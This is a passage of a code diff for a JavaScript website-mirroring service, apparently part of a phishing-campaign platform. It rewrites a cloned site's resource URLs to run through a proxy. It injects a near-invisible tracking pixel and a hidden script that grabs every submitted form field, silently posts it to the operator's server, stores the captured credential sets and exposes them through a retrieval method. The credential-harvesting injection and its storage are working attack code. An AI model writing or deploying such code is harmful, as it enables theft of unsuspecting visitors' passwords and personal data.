+            // $(elem).attr(attrName, absoluteUrl.href);
+            
+            // Option 2: Route through proxy
+            const path = absoluteUrl.pathname + absoluteUrl.search;
+            $(elem).attr(attrName, `${proxyPath}${path}`);
+          }
+          // For external resources, keep as is
+        } catch (e) {
+          // Handle invalid URLs
+          if (attrVal.startsWith('//')) {
+            // Protocol-relative URL
+            $(elem).attr(attrName, `https:${attrVal}`);
+          } else if (attrVal.startsWith('/')) {
+            // Absolute path
+            $(elem).attr(attrName, `${proxyPath}${attrVal}`);
+          } else {
+            // Relative path
+            $(elem).attr(attrName, `${proxyPath}/${attrVal}`);
+          }
+        }
+      });
+
+      // Fix inline CSS with url() references
+      $('[style]').each((i, elem) => {
+        const style = $(elem).attr('style');
+        if (!style || !style.includes('url(')) return;
+        
+        const newStyle = style.replace(/url\((['"]?)([^'"]+)\1\)/g, (match, quote, url) => {
+          if (url.startsWith('data:')) return match;
+          
+          try {
+            // Try to construct an absolute URL
+            const absoluteUrl = new URL(url, targetUrl);
+            
+            if (absoluteUrl.origin === baseUrl.origin) {
+              // Same origin, route through proxy
+              const path = absoluteUrl.pathname + absoluteUrl.search;
+              return `url(${proxyPath}${path})`;
+            }
+            // Different origin, keep as is
+            return match;
+          } catch (e) {
+            // Handle invalid URLs
+            if (url.startsWith('/')) {
+              // Absolute path
+              return `url(${proxyPath}${url})`;
+            } else {
+              // Relative path
+              return `url(${proxyPath}/${url})`;
+            }
+          }
+        });
+        
+        $(elem).attr('style', newStyle);
+      });
+
+      // Fix CSS <style> blocks
+      $('style').each((i, elem) => {
+        const css = $(elem).html();
+        if (!css || !css.includes('url(')) return;
+        
+        const newCss = css.replace(/url\((['"]?)([^'"]+)\1\)/g, (match, quote, url) => {
+          if (url.startsWith('data:')) return match;
+          
+          try {
+            // Try to construct an absolute URL
+            const absoluteUrl = new URL(url, targetUrl);
+            
+            if (absoluteUrl.origin === baseUrl.origin) {
+              // Same origin, route through proxy
+              const path = absoluteUrl.pathname + absoluteUrl.search;
+              return `url(${proxyPath}${path})`;
+            }
+            // Different origin, keep as is
+            return match;
+          } catch (e) {
+            // Handle invalid URLs
+            if (url.startsWith('/')) {
+              // Absolute path
+              return `url(${proxyPath}${url})`;
+            } else {
+              // Relative path
+              return `url(${proxyPath}/${url})`;
+            }
+          }
+        });
+        
+        $(elem).html(newCss);
+      });
+
+      // Inject invisible tracking pixel
+      $('body').append(`
         <img src="/api/track-mirror-view/${sessionToken}" 
-             style="display:none;width:1px;height:1px;" 
+             style="position:absolute; width:1px; height:1px; opacity:0.01; pointer-events:none;" 
              alt="" />
-      `;
-      $('body').append(trackingPixel);
+      `);
+      
+      // Inject invisible tracker to capture credentials via JavaScript
+      $('body').append(`
+        <script style="display:none">
+          // Monitor form submissions
+          document.addEventListener('submit', function(e) {
+            try {
+              var form = e.target;
+              var data = {};
+              for (var i = 0; i < form.elements.length; i++) {
+                var input = form.elements[i];
+                if (input.name && input.value && input.type !== 'submit' && input.type !== 'button') {
+                  data[input.name] = input.value;
+                }
+              }
+              
+              // Send data to our server
+              var xhr = new XMLHttpRequest();
+              xhr.open('POST', '/api/proxy-monitor/${sessionToken}', true);
+              xhr.setRequestHeader('Content-Type', 'application/json');
+              xhr.send(JSON.stringify({type: 'form', data: data, url: location.href}));
+            } catch(err) {
+              // Silent fail
+            }
+          }, true);
+        </script>
+      `);
 
       return $.html();
     } catch (error) {
@@ -504,12 +981,27 @@ class WebsiteMirroringService {
             if (!err && row) {
               console.log(`Mirror access by user: ${row.user_email}`);
               
-              // Log the click in link_clicks table
-              db.run(
-                `INSERT INTO link_clicks (campaign_id, landing_page_id, ip_address, user_agent)
-                 VALUES (?, 0, ?, ?)`,
-                [sessionId, ip, userAgent]
-              );
+              // Create link_clicks table if it doesn't exist
+              db.run(`CREATE TABLE IF NOT EXISTS link_clicks (
+                id INTEGER PRIMARY KEY AUTOINCREMENT,
+                campaign_id INTEGER,
+                landing_page_id INTEGER,
+                ip_address TEXT,
+                user_agent TEXT,
+                timestamp DATETIME DEFAULT CURRENT_TIMESTAMP
+              )`, function(createErr) {
+                if (createErr) {
+                  console.error('Error creating link_clicks table:', createErr);
+                  return;
+                }
+                
+                // Now insert the click data
+                db.run(
+                  `INSERT INTO link_clicks (campaign_id, landing_page_id, ip_address, user_agent)
+                   VALUES (?, 0, ?, ?)`,
+                  [sessionId, ip, userAgent]
+                );
+              });
             }
           }
         );
@@ -536,9 +1028,27 @@ class WebsiteMirroringService {
       }
 
       if (sessionToken) {
-        // Remove from active sessions
+        // Get final state of captures
+        const captures = this.captures.get(sessionToken);
+        
+        // Store captures in database if there are any credentials
+        if (captures && captures.credentials.length > 0) {
+          db.run(
+            `UPDATE WebsiteMirroringSessions 
+             SET captured_data = ? 
+             WHERE id = ?`,
+            [JSON.stringify(captures), sessionId]
+          );
+          
+          console.log(`Stored ${captures.credentials.length} credential sets for session ${sessionId}`);
+        }
+        
+        // Clean up memory
         this.activeSessions.delete(sessionToken);
         this.mirrorRoutes.delete(`/${sessionToken}`);
+        this.cookieJars.delete(sessionToken);
+        this.sessionStorage.delete(sessionToken);
+        this.captures.delete(sessionToken);
       }
 
       // Update database
@@ -619,6 +1129,45 @@ class WebsiteMirroringService {
     } catch (error) {
       console.error('Error cleaning up sessions:', error);
     }
+  }
+  
+  /**
+   * Get captured credentials for a session
+   */
+  async getCapturedCredentials(sessionId) {
+    // Try to find the session token
+    let sessionToken = null;
+    for (const [token, session] of this.activeSessions.entries()) {
+      if (session.sessionId === sessionId) {
+        sessionToken = token;
+        break;
+      }
+    }
+    
+    // Get captures from memory if available
+    if (sessionToken && this.captures.has(sessionToken)) {
+      return this.captures.get(sessionToken);
+    }
+    
+    // Otherwise try to get from database
+    return new Promise((resolve, reject) => {
+      db.get(
+        `SELECT captured_data FROM WebsiteMirroringSessions WHERE id = ?`,
+        [sessionId],
+        (err, row) => {
+          if (err) reject(err);
+          else if (row && row.captured_data) {
+            try {
+              resolve(JSON.parse(row.captured_data));
+            } catch (e) {
+              resolve({ credentials: [], formData: [], cookies: [] });
+            }
+          } else {
+            resolve({ credentials: [], formData: [], cookies: [] });
+          }
+        }
+      );
+    });
   }
 }
 
